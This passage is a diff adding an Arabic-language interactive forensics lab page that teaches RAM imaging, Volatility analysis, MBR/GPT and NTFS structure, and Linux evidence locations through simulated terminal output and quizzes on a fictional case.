@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>مختبر RAM والأقراص الصلبة</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+[onclick]{cursor:pointer}
+input,select,textarea,button{font-size:16px;touch-action:manipulation}
+button{touch-action:manipulation}
+body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:#0a0f1e;color:#e0e6f0;min-height:100vh;-webkit-text-size-adjust:100%}
+.header{background:linear-gradient(135deg,#0d1b2a,#1a2a0d);padding:20px 30px;border-bottom:2px solid #22c55e;display:flex;align-items:center;gap:15px;flex-wrap:wrap}
+.header h1{font-size:1.4rem;color:#22c55e}
+.tabs{display:flex;gap:0;background:#071020;border-bottom:1px solid #1e3a5c;padding:0 10px;overflow-x:auto;-webkit-overflow-scrolling:touch}
+.tab{padding:12px 16px;cursor:pointer;color:#7ab3d4;border-bottom:3px solid transparent;white-space:nowrap;font-size:.85rem;transition:all .2s;user-select:none}
+.tab.active{color:#22c55e;border-bottom-color:#22c55e}
+.panel{display:none;padding:20px;max-width:960px;margin:0 auto}
+.panel.active{display:block}
+h2{color:#22c55e;margin-bottom:6px;font-size:1.15rem}
+.sub{color:#7ab3d4;font-size:.85rem;margin-bottom:18px;line-height:1.7}
+.card{background:#0d1b2a;border:1px solid #1e3a5c;border-radius:12px;padding:20px;margin-bottom:16px}
+.card h3{color:#22c55e;margin-bottom:12px;font-size:.95rem}
+.terminal{background:#020a06;border:1px solid #1e5c1e;border-radius:8px;padding:14px;font-family:'Courier New',monospace;font-size:.78rem;margin:10px 0;overflow-x:auto;-webkit-overflow-scrolling:touch}
+.prompt{color:#00ff88}.cmd{color:#fff}.out{color:#7fbb7f;white-space:pre-wrap}
+.alert{padding:11px 14px;border-radius:6px;margin:8px 0;font-size:.85rem;line-height:1.6}
+.alert-green{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.3);color:#22c55e}
+.alert-info{background:rgba(0,212,255,.1);border:1px solid rgba(0,212,255,.3);color:#7ab3d4}
+.alert-warn{background:rgba(255,170,0,.1);border:1px solid rgba(255,170,0,.3);color:#ffaa00}
+.alert-danger{background:rgba(255,68,68,.1);border:1px solid rgba(255,68,68,.3);color:#ff8888}
+.alert-success{background:rgba(0,255,136,.1);border:1px solid rgba(0,255,136,.3);color:#00ff88}
+.btn{padding:9px 18px;border:none;border-radius:6px;font-size:.86rem;cursor:pointer;font-weight:600;transition:all .2s;touch-action:manipulation}
+.btn-green{background:#22c55e;color:#000}.btn-green:hover{background:#16a34a}
+.btn-outline{background:transparent;border:1px solid #22c55e;color:#22c55e}
+.btn-outline:hover{background:#22c55e;color:#000}
+.btn-sm{padding:6px 12px;font-size:.78rem}
+.data-table{width:100%;border-collapse:collapse;font-size:.8rem}
+.data-table th{background:#0d2a1a;color:#22c55e;padding:8px;text-align:right;border-bottom:2px solid #1e5c3a}
+.data-table td{padding:8px;border-bottom:1px solid #1e3a5c;color:#aab8c8;font-family:monospace;font-size:.76rem}
+.data-table tr.highlight td{background:rgba(255,68,68,.08);color:#ff8888}
+.data-table tr:hover td{background:rgba(34,197,94,.04)}
+.quiz-box{background:#0d1b2a;border:1px solid #1e3a5c;border-radius:8px;padding:16px;margin:12px 0}
+.quiz-box h4{color:#22c55e;margin-bottom:10px;font-size:.9rem}
+.options label{display:flex;align-items:center;gap:10px;padding:9px 12px;margin:5px 0;background:#071020;border:1px solid #1e3a5c;border-radius:6px;cursor:pointer;font-size:.86rem;-webkit-tap-highlight-color:transparent}
+.options label.correct{border-color:#00ff88;background:rgba(0,255,136,.08);color:#00ff88}
+.options label.wrong{border-color:#ff4444;background:rgba(255,68,68,.08);color:#ff8888}
+.options input{accent-color:#22c55e;flex-shrink:0}
+.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.72rem;font-weight:bold}
+.badge-green{background:rgba(34,197,94,.2);color:#22c55e}
+.badge-red{background:rgba(255,68,68,.2);color:#ff8888}
+.badge-orange{background:rgba(255,170,0,.2);color:#ffaa00}
+.badge-blue{background:rgba(0,212,255,.2);color:#00d4ff}
+.disk-visual{display:flex;flex-direction:column;gap:3px;font-family:'Courier New',monospace;font-size:.78rem}
+.disk-sector{display:flex;align-items:center;gap:10px;padding:6px 10px;border-radius:4px;transition:all .2s}
+.disk-sector:hover{opacity:.85}
+.sector-addr{color:#556070;min-width:80px}
+.sector-label{flex:1}
+.sector-bar{height:18px;border-radius:3px;min-width:20px}
+.mem-map{display:grid;gap:3px}
+.mem-row{display:flex;gap:3px;align-items:center}
+.mem-addr{color:#556070;font-family:monospace;font-size:.7rem;min-width:80px}
+.mem-block{height:20px;border-radius:2px;flex:1;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;font-size:.65rem;color:rgba(255,255,255,.7)}
+.mem-block:hover{opacity:.8;transform:scaleY(1.1)}
+.code-block{background:#020a06;border:1px solid #1e3a5c;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:.78rem;line-height:1.8;overflow-x:auto;white-space:pre}
+.kw{color:#22c55e}.str{color:#00ff88}.comment{color:#556070}
+.ext4-map{display:grid;grid-template-columns:repeat(8,1fr);gap:3px;margin:10px 0}
+.ext4-block{height:36px;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:.65rem;text-align:center;cursor:pointer;transition:all .2s;padding:2px}
+.ext4-block:hover{opacity:.8}
+.process-row{display:flex;gap:8px;padding:7px 10px;border-bottom:1px solid #1e3a5c;font-family:monospace;font-size:.76rem;align-items:center}
+.process-row.malicious{background:rgba(255,68,68,.07)}
+.p-pid{min-width:40px;color:#7ab3d4}
+.p-name{min-width:150px;color:#e0e6f0}
+.p-ppid{min-width:50px;color:#556070}
+.p-path{flex:1;color:#556070;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:.7rem}
+.p-flag{font-size:.75rem}
+.volatility-plugin{display:flex;gap:10px;align-items:center;padding:10px;border:1px solid #1e3a5c;border-radius:6px;margin:5px 0;cursor:pointer;transition:all .2s}
+.volatility-plugin:hover{border-color:#22c55e;background:rgba(34,197,94,.04)}
+.volatility-plugin.run{border-color:#22c55e;background:rgba(34,197,94,.04)}
+.vp-name{color:#22c55e;font-family:monospace;min-width:160px;font-size:.85rem}
+.vp-desc{color:#7ab3d4;flex:1;font-size:.82rem}
+.vp-btn{font-size:.75rem;padding:4px 10px}
+.linux-log{background:#020a06;border:1px solid #1e3a5c;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:.76rem;line-height:1.9;max-height:280px;overflow-y:auto}
+.log-time{color:#7ab3d4}
+.log-host{color:#22c55e}
+.log-service{color:#ffaa00}
+.log-msg{color:#aab8c8}
+.log-alert{color:#ff4444;font-weight:bold}
+.partition-row{display:flex;gap:0;height:44px;border-radius:6px;overflow:hidden;margin:10px 0}
+.part{display:flex;align-items:center;justify-content:center;font-size:.72rem;font-weight:bold;transition:all .2s;cursor:pointer;flex-direction:column;gap:2px}
+.part:hover{opacity:.85}
+.part span{font-size:.62rem;opacity:.8}
+</style>
+</head>
+<body>
+<div class="header">
+  <div style="font-size:2rem">💾</div>
+  <div>
+    <h1>مختبر الذاكرة العشوائية والأقراص الصلبة</h1>
+    <div style="color:#16a34a;font-size:.82rem">RAM Forensics · Disk Structure · Linux Forensics — الفصلان الأول والخامس</div>
+  </div>
+  <a href="lab.html" style="margin-right:auto;color:#7ab3d4;font-size:.82rem;text-decoration:none;border:1px solid #1e3a5c;padding:6px 12px;border-radius:6px">← المختبر الرئيسي</a>
+</div>
+
+<div class="tabs">
+  <div class="tab active" onclick="showTab('ram')">🧠 RAM Forensics</div>
+  <div class="tab" onclick="showTab('volatility')">⚡ Volatility</div>
+  <div class="tab" onclick="showTab('mbr')">💿 MBR / GPT</div>
+  <div class="tab" onclick="showTab('ntfs')">📂 NTFS & MFT</div>
+  <div class="tab" onclick="showTab('linux')">🐧 Linux Forensics</div>
+  <div class="tab" onclick="showTab('ext4')">🗄️ ext4 File System</div>
+</div>
+
+<!-- RAM FORENSICS -->
+<div class="panel active" id="tab-ram">
+  <h2>🧠 الذاكرة العشوائية (RAM) — الدليل المتطاير</h2>
+  <p class="sub">RAM تحتوي على بيانات حيّة لا توجد في أي مكان آخر: كلمات مرور مفكوكة، عمليات جارية، مفاتيح تشفير، اتصالات شبكية. تُفقَد نهائياً عند إيقاف الجهاز.</p>
+
+  <div class="card">
+    <h3>⚡ ما يوجد في RAM ولا يوجد على القرص</h3>
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-bottom:14px">
+      <div style="background:#071020;border:1px solid #1e5c3a;border-radius:8px;padding:12px;text-align:center;cursor:pointer" onclick="showRAMItem(this,'passwords')">
+        <div style="font-size:1.6rem;margin-bottom:6px">🔑</div>
+        <div style="color:#22c55e;font-size:.82rem;font-weight:bold">كلمات المرور</div>
+        <div style="color:#556070;font-size:.72rem;margin-top:3px">مفكوكة في الذاكرة</div>
+      </div>
+      <div style="background:#071020;border:1px solid #1e5c3a;border-radius:8px;padding:12px;text-align:center;cursor:pointer" onclick="showRAMItem(this,'processes')">
+        <div style="font-size:1.6rem;margin-bottom:6px">⚙️</div>
+        <div style="color:#22c55e;font-size:.82rem;font-weight:bold">العمليات الجارية</div>
+        <div style="color:#556070;font-size:.72rem;margin-top:3px">حتى المخفية</div>
+      </div>
+      <div style="background:#071020;border:1px solid #1e5c3a;border-radius:8px;padding:12px;text-align:center;cursor:pointer" onclick="showRAMItem(this,'network')">
+        <div style="font-size:1.6rem;margin-bottom:6px">🌐</div>
+        <div style="color:#22c55e;font-size:.82rem;font-weight:bold">الاتصالات الشبكية</div>
+        <div style="color:#556070;font-size:.72rem;margin-top:3px">الجلسات المفتوحة</div>
+      </div>
+      <div style="background:#071020;border:1px solid #1e5c3a;border-radius:8px;padding:12px;text-align:center;cursor:pointer" onclick="showRAMItem(this,'encryption')">
+        <div style="font-size:1.6rem;margin-bottom:6px">🔐</div>
+        <div style="color:#22c55e;font-size:.82rem;font-weight:bold">مفاتيح التشفير</div>
+        <div style="color:#556070;font-size:.72rem;margin-top:3px">BitLocker / VeraCrypt</div>
+      </div>
+      <div style="background:#071020;border:1px solid #1e5c3a;border-radius:8px;padding:12px;text-align:center;cursor:pointer" onclick="showRAMItem(this,'clipboard')">
+        <div style="font-size:1.6rem;margin-bottom:6px">📋</div>
+        <div style="color:#22c55e;font-size:.82rem;font-weight:bold">الحافظة (Clipboard)</div>
+        <div style="color:#556070;font-size:.72rem;margin-top:3px">ما تم نسخه</div>
+      </div>
+      <div style="background:#071020;border:1px solid #1e5c3a;border-radius:8px;padding:12px;text-align:center;cursor:pointer" onclick="showRAMItem(this,'malware')">
+        <div style="font-size:1.6rem;margin-bottom:6px">🦠</div>
+        <div style="color:#22c55e;font-size:.82rem;font-weight:bold">Fileless Malware</div>
+        <div style="color:#556070;font-size:.72rem;margin-top:3px">لا أثر على القرص</div>
+      </div>
+    </div>
+    <div id="ram-item-detail"></div>
+  </div>
+
+  <div class="card">
+    <h3>🗺️ خريطة الذاكرة — ما يحتله كل منطقة</h3>
+    <div class="mem-map" id="mem-map"></div>
+    <div style="margin-top:10px;display:flex;gap:12px;flex-wrap:wrap;font-size:.75rem">
+      <span><span style="display:inline-block;width:12px;height:12px;background:#1e3a5c;border-radius:2px;margin-left:4px"></span>فارغ</span>
+      <span><span style="display:inline-block;width:12px;height:12px;background:#22c55e;border-radius:2px;margin-left:4px"></span>نظام التشغيل</span>
+      <span><span style="display:inline-block;width:12px;height:12px;background:#00d4ff;border-radius:2px;margin-left:4px"></span>تطبيقات</span>
+      <span><span style="display:inline-block;width:12px;height:12px;background:#a855f7;border-radius:2px;margin-left:4px"></span>مشبوه</span>
+      <span><span style="display:inline-block;width:12px;height:12px;background:#ffaa00;border-radius:2px;margin-left:4px"></span>مخزن مؤقت</span>
+    </div>
+    <div id="mem-detail" style="margin-top:10px"></div>
+  </div>
+
+  <div class="card">
+    <h3>📸 كيف نستخرج صورة RAM (Memory Dump)</h3>
+    <div class="terminal">
+      <div class="prompt">investigator@forensics:~$ <span class="cmd">winpmem_mini_x64.exe memdump.raw</span></div>
+      <div class="out">WinPmem 4.0.rc1 - Memory Imager
+Dumping memory to: memdump.raw
+<span style="color:#22c55e">Imaging memory (16,384 MB)...</span>
+[████████████████████] 100% — 16.0 GB written
+MD5: a3f7c9d2e1b845f0123456789abcdef0
+<span style="color:#00ff88">Memory dump complete. File: memdump.raw (16,384 MB)</span></div>
+    </div>
+    <div class="alert alert-warn">⚠️ <strong>ترتيب الأولوية للأدلة المتطايرة (RFC 3227):</strong><br>
+    1. سجلات CPU والـ Cache | 2. RAM | 3. حالة الشبكة | 4. العمليات الجارية | 5. القرص الصلب
+    </div>
+    <div class="quiz-box">
+      <h4>❓ وصل المحقق لمشهد جريمة والجهاز يعمل. ما الخطوة الأولى؟</h4>
+      <div class="options" id="q-ram">
+        <label><input type="radio" name="q-ram" value="a"> إيقاف الجهاز فوراً لحماية القرص الصلب</label>
+        <label><input type="radio" name="q-ram" value="b"> استخراج صورة RAM أولاً قبل أي شيء — لأن إيقاف الجهاز يمحوها نهائياً</label>
+        <label><input type="radio" name="q-ram" value="c"> تصوير الشاشة فقط</label>
+        <label><input type="radio" name="q-ram" value="d"> فصل الإنترنت أولاً</label>
+      </div>
+      <button class="btn btn-green" style="margin-top:10px" onclick="checkQ('q-ram','b','ram-res',15)">إرسال</button>
+      <div id="ram-res"></div>
+    </div>
+  </div>
+</div>
+
+<!-- VOLATILITY -->
+<div class="panel" id="tab-volatility">
+  <h2>⚡ Volatility Framework — تحليل صورة RAM</h2>
+  <p class="sub">Volatility هي الأداة الأشهر لتحليل صور الذاكرة. تستطيع استخراج العمليات، الاتصالات، كلمات المرور، والبرمجيات الخبيثة من ملف RAM dump.</p>
+
+  <div class="card">
+    <h3>🔌 إضافات Volatility الأساسية — اضغط لتشغيل أي منها</h3>
+    <div class="analysis-steps" id="vol-plugins">
+      <div class="volatility-plugin" onclick="runVolPlugin(this,'pslist')">
+        <div class="vp-name">pslist</div>
+        <div class="vp-desc">قائمة كل العمليات الجارية من EPROCESS structure</div>
+        <button class="btn btn-outline btn-sm vp-btn">▶ شغّل</button>
+      </div>
+      <div class="volatility-plugin" onclick="runVolPlugin(this,'pstree')">
+        <div class="vp-name">pstree</div>
+        <div class="vp-desc">شجرة العمليات — من أطلق من (Parent/Child)</div>
+        <button class="btn btn-outline btn-sm vp-btn">▶ شغّل</button>
+      </div>
+      <div class="volatility-plugin" onclick="runVolPlugin(this,'netscan')">
+        <div class="vp-name">netscan</div>
+        <div class="vp-desc">كل الاتصالات الشبكية المفتوحة وقت أخذ الـ dump</div>
+        <button class="btn btn-outline btn-sm vp-btn">▶ شغّل</button>
+      </div>
+      <div class="volatility-plugin" onclick="runVolPlugin(this,'cmdline')">
+        <div class="vp-name">cmdline</div>
+        <div class="vp-desc">الأوامر التي نُفِّذت في command line</div>
+        <button class="btn btn-outline btn-sm vp-btn">▶ شغّل</button>
+      </div>
+      <div class="volatility-plugin" onclick="runVolPlugin(this,'hashdump')">
+        <div class="vp-name">hashdump</div>
+        <div class="vp-desc">استخراج هاشات كلمات مرور Windows من SAM في الذاكرة</div>
+        <button class="btn btn-outline btn-sm vp-btn">▶ شغّل</button>
+      </div>
+      <div class="volatility-plugin" onclick="runVolPlugin(this,'malfind')">
+        <div class="vp-name">malfind</div>
+        <div class="vp-desc">اكتشاف مناطق ذاكرة مشبوهة قد تحتوي Shellcode أو Injected Code</div>
+        <button class="btn btn-outline btn-sm vp-btn">▶ شغّل</button>
+      </div>
+      <div class="volatility-plugin" onclick="runVolPlugin(this,'dlllist')">
+        <div class="vp-name">dlllist</div>
+        <div class="vp-desc">قائمة الـ DLL المحمّلة لكل عملية — يكشف DLL Injection</div>
+        <button class="btn btn-outline btn-sm vp-btn">▶ شغّل</button>
+      </div>
+    </div>
+    <div class="terminal" style="margin-top:14px">
+      <div class="prompt" id="vol-cmd">analyst@forensics:~$ volatility3 -f memdump.raw <span class="cmd" id="vol-plugin-name">windows.pslist</span></div>
+      <div class="out" id="vol-output">اضغط على أي إضافة أعلاه لرؤية نتائجها...</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>🚨 تحليل العمليات المشبوهة</h3>
+    <div style="background:#020a06;border:1px solid #1e3a5c;border-radius:8px;overflow:hidden">
+      <div style="display:flex;gap:8px;padding:8px 10px;background:#0d1b2a;color:#7ab3d4;font-size:.75rem;font-family:monospace">
+        <span style="min-width:40px">PID</span>
+        <span style="min-width:150px">الاسم</span>
+        <span style="min-width:50px">PPID</span>
+        <span style="flex:1">المسار / ملاحظة</span>
+        <span style="min-width:60px">حكم</span>
+      </div>
+      <div id="process-list"></div>
+    </div>
+    <div class="alert alert-danger" style="margin-top:10px" id="process-note" style="display:none"></div>
+    <div class="quiz-box">
+      <h4>❓ وجدت عملية اسمها <code>svchost.exe</code> لكن PPID تابعة لـ <code>explorer.exe</code> بدلاً من <code>services.exe</code>. ماذا يعني هذا؟</h4>
+      <div class="options" id="q-vol">
+        <label><input type="radio" name="q-vol" value="a"> أمر طبيعي — svchost يعمل من أي مكان</label>
+        <label><input type="radio" name="q-vol" value="b"> مشبوه — svchost الحقيقي يُطلَق دائماً من services.exe. هذه علامة على Process Hollowing أو Malware</label>
+        <label><input type="radio" name="q-vol" value="c"> خطأ في Volatility</label>
+        <label><input type="radio" name="q-vol" value="d"> التطبيق يستخدم svchost للتسريع</label>
+      </div>
+      <button class="btn btn-green" style="margin-top:10px" onclick="checkQ('q-vol','b','vol-res',15)">إرسال</button>
+      <div id="vol-res"></div>
+    </div>
+  </div>
+</div>
+
+<!-- MBR / GPT -->
+<div class="panel" id="tab-mbr">
+  <h2>💿 بنية القرص — MBR و GPT</h2>
+  <p class="sub">القرص الصلب ليس مجرد ملفات — له بنية منطقية دقيقة. فهم هذه البنية يُمكّن المحقق من اكتشاف الأقسام المخفية والبيانات المحذوفة من خارج نظام الملفات.</p>
+
+  <div class="card">
+    <h3>📐 MBR — Master Boot Record (أول 512 بايت)</h3>
+    <div class="partition-row">
+      <div class="part" style="background:#1e3a5c;flex:0 0 180px;color:#7ab3d4" onclick="showMBRSection('bootcode')">
+        Bootstrap Code<span>446 بايت</span>
+      </div>
+      <div class="part" style="background:#1e5c3a;flex:1;color:#22c55e" onclick="showMBRSection('parttable')">
+        Partition Table<span>64 بايت (4 إدخالات)</span>
+      </div>
+      <div class="part" style="background:#5c3a1e;flex:0 0 60px;color:#ffaa00" onclick="showMBRSection('sig')">
+        Signature<span>0x55AA</span>
+      </div>
+    </div>
+    <div id="mbr-detail" style="margin-top:12px"></div>
+    <button class="btn btn-green btn-sm" style="margin-top:10px" onclick="showMBRHex()">🔍 عرض MBR كـ Hex</button>
+    <div id="mbr-hex" style="margin-top:10px"></div>
+  </div>
+
+  <div class="card">
+    <h3>🆚 MBR مقابل GPT</h3>
+    <div style="overflow-x:auto">
+    <table class="data-table" style="font-family:inherit">
+      <tr><th>الخاصية</th><th>MBR (قديم)</th><th>GPT (حديث)</th></tr>
+      <tr><td>أقصى حجم قرص</td><td style="color:#ff8888">2 تيرابايت</td><td style="color:#22c55e">9.4 زيتابايت (لا نهاية عملياً)</td></tr>
+      <tr><td>عدد الأقسام</td><td style="color:#ff8888">4 أقسام رئيسية</td><td style="color:#22c55e">128 قسم</td></tr>
+      <tr><td>النسخ الاحتياطي</td><td style="color:#ff8888">لا يوجد</td><td style="color:#22c55e">نسخة احتياطية في نهاية القرص</td></tr>
+      <tr><td>التحقق من السلامة</td><td style="color:#ff8888">لا يوجد</td><td style="color:#22c55e">CRC32 checksum</td></tr>
+      <tr><td>التوافق</td><td style="color:#22c55e">كل الأنظمة</td><td style="color:#ffaa00">يحتاج UEFI (أنظمة حديثة)</td></tr>
+      <tr><td>أهمية جنائية</td><td style="color:#ffaa00">الأقسام المخفية سهلة الإنشاء</td><td style="color:#22c55e">GUID يُحدّد نوع كل قسم بدقة</td></tr>
+    </table>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>🔍 قراءة جدول الأقسام من الـ Terminal</h3>
+    <div class="terminal">
+      <div class="prompt">analyst@forensics:~$ <span class="cmd">fdisk -l khalid_disk.img</span></div>
+      <div class="out">Disk khalid_disk.img: 500 GiB
+Disklabel type: dos (MBR)
+
+Device              Boot    Start       End    Sectors   Size  Type
+khalid_disk.img1    *        2048    206847    204800   100M  EFI System
+khalid_disk.img2          206848 943720447 943513600   450G  Microsoft basic data
+<span style="color:#ff4444">khalid_disk.img3       943720448 976771071  33050624  15.8G  Hidden partition ← مشبوه!</span></div>
+    </div>
+    <div class="alert alert-danger">🚨 قسم مخفي (Hidden) في نهاية القرص! لا يظهر في Windows العادي — ماذا يخفي؟</div>
+    <button class="btn btn-green" onclick="mountHidden()">🔍 فحص القسم المخفي</button>
+    <div id="hidden-result" style="margin-top:10px"></div>
+    <div class="quiz-box">
+      <h4>❓ ما الأمر الصحيح لفحص القسم المخفي الذي يبدأ عند sector 943720448؟</h4>
+      <div class="options" id="q-mbr">
+        <label><input type="radio" name="q-mbr" value="a"> <code>mount -o loop khalid_disk.img /mnt/</code></label>
+        <label><input type="radio" name="q-mbr" value="b"> <code>mount -o loop,offset=$((943720448*512)) khalid_disk.img /mnt/hidden/</code></label>
+        <label><input type="radio" name="q-mbr" value="c"> <code>fdisk -d khalid_disk.img</code></label>
+        <label><input type="radio" name="q-mbr" value="d"> <code>dd if=khalid_disk.img of=hidden.img</code></label>
+      </div>
+      <button class="btn btn-green" style="margin-top:10px" onclick="checkQ('q-mbr','b','mbr-res',15)">إرسال</button>
+      <div id="mbr-res"></div>
+    </div>
+  </div>
+</div>
+
+<!-- NTFS & MFT -->
+<div class="panel" id="tab-ntfs">
+  <h2>📂 نظام ملفات NTFS والـ Master File Table</h2>
+  <p class="sub">NTFS (New Technology File System) هو نظام ملفات Windows الحديث. قلبه هو MFT — جدول ضخم يحتوي إدخالاً لكل ملف وكل مجلد على القرص، حتى المحذوفة.</p>
+
+  <div class="card">
+    <h3>🗂️ بنية NTFS الأساسية</h3>
+    <div class="disk-visual">
+      <div class="disk-sector" style="background:#1e3a5c">
+        <div class="sector-addr">Cluster 0</div>
+        <div class="sector-bar" style="width:80px;background:#22c55e"></div>
+        <div class="sector-label" style="color:#22c55e">VBR — Volume Boot Record (أول قطاع)</div>
+      </div>
+      <div class="disk-sector" style="background:#1e3a1a" onclick="showMFTDetail()">
+        <div class="sector-addr">Cluster 4</div>
+        <div class="sector-bar" style="width:120px;background:#00d4ff"></div>
+        <div class="sector-label" style="color:#00d4ff">$MFT — Master File Table ← اضغط 👆</div>
+      </div>
+      <div class="disk-sector" style="background:#1e3a1a">
+        <div class="sector-addr">Cluster 6</div>
+        <div class="sector-bar" style="width:60px;background:#7ab3d4"></div>
+        <div class="sector-label" style="color:#7ab3d4">$MFTMirr — نسخة احتياطية من أول 4 إدخالات MFT</div>
+      </div>
+      <div class="disk-sector" style="background:#1e3a1a">
+        <div class="sector-addr">Cluster 8</div>
+        <div class="sector-bar" style="width:200px;background:#ffaa00"></div>
+        <div class="sector-label" style="color:#ffaa00">$LogFile — سجل المعاملات (Journaling)</div>
+      </div>
+      <div class="disk-sector" style="background:#1e3a1a">
+        <div class="sector-addr">...</div>
+        <div class="sector-bar" style="width:100%;background:#1e5c3a"></div>
+        <div class="sector-label" style="color:#7ab3d4">Data Area — بيانات الملفات الفعلية</div>
+      </div>
+    </div>
+    <div id="mft-detail" style="margin-top:12px"></div>
+  </div>
+
+  <div class="card">
+    <h3>🔬 إدخال MFT مفصّل — ملف واحد</h3>
+    <button class="btn btn-green" onclick="showMFTEntry()">📋 استعراض إدخال MFT</button>
+    <div id="mft-entry" style="margin-top:12px"></div>
+  </div>
+
+  <div class="card">
+    <h3>🗑️ الملفات المحذوفة في NTFS</h3>
+    <div class="alert alert-info">💡 في NTFS عند حذف ملف: الإدخال في MFT يُوسَم بـ "غير مستخدم" لكن البيانات تبقى حتى تُكتب فوقها. هذا ما يُمكّن الاسترداد.</div>
+    <div class="terminal">
+      <div class="prompt">analyst@forensics:~$ <span class="cmd">python3 analyzeMFT.py -f khalid_disk.img -o mft_output.csv</span></div>
+      <div class="out">Analyzing MFT...
+Total records: 248,312
+Active files: 231,445
+<span style="color:#ff4444">Deleted files: 16,867 ← قابلة للفحص!</span>
+
+Interesting deleted files found:
+  [DELETED] secret_transfer.xlsx  — 2024-03-20 14:30:22
+  [DELETED] chat_logs_backup.zip  — 2024-03-20 14:31:05
+  [DELETED] payment_proof.pdf     — 2024-03-20 14:31:58</div>
+    </div>
+    <div class="alert alert-danger">🚨 ثلاثة ملفات حساسة محذوفة في نفس الدقيقة — يؤكد محاولة إخفاء الدليل!</div>
+    <div class="quiz-box">
+      <h4>❓ ملف حُذف من NTFS منذ ساعة. هل يمكن استرداده؟</h4>
+      <div class="options" id="q-ntfs">
+        <label><input type="radio" name="q-ntfs" value="a"> لا — الحذف نهائي دائماً</label>
+        <label><input type="radio" name="q-ntfs" value="b"> نعم — ما لم تُكتب بيانات جديدة فوق Clusters الملف، البيانات لا تزال موجودة</label>
+        <label><input type="radio" name="q-ntfs" value="c"> فقط إذا كان في سلة المهملات</label>
+        <label><input type="radio" name="q-ntfs" value="d"> يعتمد على نوع الملف فقط</label>
+      </div>
+      <button class="btn btn-green" style="margin-top:10px" onclick="checkQ('q-ntfs','b','ntfs-res',15)">إرسال</button>
+      <div id="ntfs-res"></div>
+    </div>
+  </div>
+</div>
+
+<!-- LINUX FORENSICS -->
+<div class="panel" id="tab-linux">
+  <h2>🐧 تحليل أنظمة Linux</h2>
+  <p class="sub">كثير من الخوادم تعمل بـ Linux. المحقق يحتاج معرفة مواقع الأدلة الجنائية: السجلات، سجل الأوامر، ملفات الجدولة، والاتصالات.</p>
+
+  <div class="card">
+    <h3>📁 خريطة الأدلة الجنائية في Linux</h3>
+    <div style="font-family:'Courier New',monospace;font-size:.78rem;background:#020a06;border-radius:8px;padding:14px;border:1px solid #1e3a5c;line-height:2">
+      <div style="color:#22c55e">/var/log/ ← <span style="color:#7ab3d4">كنز الأدلة الأول</span></div>
+      <div style="padding-right:20px"><span class="log-service">auth.log</span> <span style="color:#7ab3d4">← تسجيلات الدخول، sudo، SSH</span></div>
+      <div style="padding-right:20px"><span class="log-service">syslog</span> <span style="color:#7ab3d4">← أحداث النظام العامة</span></div>
+      <div style="padding-right:20px"><span class="log-service">apache2/access.log</span> <span style="color:#7ab3d4">← طلبات الويب</span></div>
+      <div style="padding-right:20px"><span class="log-service">cron.log</span> <span style="color:#ffaa00">← المهام المجدولة ⚠️</span></div>
+      <div style="padding-right:20px"><span class="log-service">wtmp / btmp</span> <span style="color:#7ab3d4">← سجل كل جلسات الدخول</span></div>
+      <div style="color:#22c55e;margin-top:4px">/home/user/ ← <span style="color:#7ab3d4">بيانات المستخدم</span></div>
+      <div style="padding-right:20px"><span style="color:#ff4444">.bash_history</span> <span style="color:#7ab3d4">← سجل كل الأوامر المنفذة ⭐</span></div>
+      <div style="padding-right:20px"><span style="color:#ffaa00">.ssh/known_hosts</span> <span style="color:#7ab3d4">← الخوادم التي اتصل بها</span></div>
+      <div style="padding-right:20px"><span style="color:#ffaa00">.bash_profile / .bashrc</span> <span style="color:#7ab3d4">← قد يحتوي أوامر خبيثة</span></div>
+      <div style="color:#22c55e;margin-top:4px">/etc/ ← <span style="color:#7ab3d4">إعدادات النظام</span></div>
+      <div style="padding-right:20px"><span style="color:#ffaa00">crontab / cron.d/</span> <span style="color:#7ab3d4">← مهام مجدولة — Persistence!</span></div>
+      <div style="padding-right:20px"><span style="color:#ff4444">passwd / shadow</span> <span style="color:#7ab3d4">← حسابات المستخدمين وكلمات المرور</span></div>
+      <div style="color:#22c55e;margin-top:4px">/tmp/ و /dev/shm/ ← <span style="color:#ff4444">يُستخدمان لإخفاء الملفات الخبيثة ⚠️</span></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>🕵️ تحليل bash_history — سجل الأوامر</h3>
+    <button class="btn btn-green" onclick="showBashHistory()">📋 استعراض bash_history المشبوه</button>
+    <div id="bash-history" style="margin-top:12px"></div>
+  </div>
+
+  <div class="card">
+    <h3>📊 تحليل سجلات auth.log</h3>
+    <div class="linux-log" id="auth-log">اضغط "تحميل السجل" لعرض المحتوى</div>
+    <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
+      <button class="btn btn-green btn-sm" onclick="loadAuthLog()">📂 تحميل السجل</button>
+      <button class="btn btn-outline btn-sm" onclick="filterAuthLog('failed')">🔴 فشل الدخول فقط</button>
+      <button class="btn btn-outline btn-sm" onclick="filterAuthLog('sudo')">⚙️ sudo فقط</button>
+      <button class="btn btn-outline btn-sm" onclick="filterAuthLog('ssh')">🔗 SSH فقط</button>
+    </div>
+    <div id="auth-analysis" style="margin-top:10px"></div>
+    <div class="quiz-box">
+      <h4>❓ المحقق يرى 487 محاولة SSH فاشلة من IP واحد خلال دقيقة. ما هذا الهجوم؟</h4>
+      <div class="options" id="q-linux">
+        <label><input type="radio" name="q-linux" value="a"> المستخدم نسي كلمة المرور</label>
+        <label><input type="radio" name="q-linux" value="b"> Brute Force Attack — هجوم القوة الغاشمة على SSH</label>
+        <label><input type="radio" name="q-linux" value="c"> خطأ في إعداد الخادم</label>
+        <label><input type="radio" name="q-linux" value="d"> تحديث تلقائي للنظام</label>
+      </div>
